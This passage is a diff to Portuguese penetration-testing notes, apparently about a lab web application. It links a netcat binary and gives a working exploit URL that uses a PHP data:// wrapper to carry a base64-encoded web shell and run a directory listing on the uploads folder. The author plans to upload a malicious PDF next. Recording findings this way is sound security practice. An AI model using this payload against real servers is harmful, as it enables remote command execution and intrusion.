@@ -31,7 +31,18 @@
   <img width="383" height="332" alt="image" src="https://github.com/user-attachments/assets/b313b975-e39f-4e95-96be-c41b3380d39b" />
 </p>
 
+--- 
 - https://github.com/diegocr/netcat/blob/master/nc.exe
 <p align="center">
   <img width="522" height="512" alt="image" src="https://github.com/user-attachments/assets/e76a7de6-f0a2-494e-ac38-2a156713142f" />
 </p>
+
+---
+- Descobri onde se encontra o banco de Dados da aplicação agora é so mandar um arquivo .pdf malicioso pra lá e executar
+
+link : http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls%20-la%20/var/www/html/uploads
+
+<img width="472" height="150" alt="image" src="https://github.com/user-attachments/assets/9476b697-f51f-469b-86ef-0e02fc1fcd08" />
+- esse arquivo Proposta de Atividade.pdf foi eu que enviei testando a pagina de upload
+- Provando que aqui se instala o banco de dados da pagina de
+
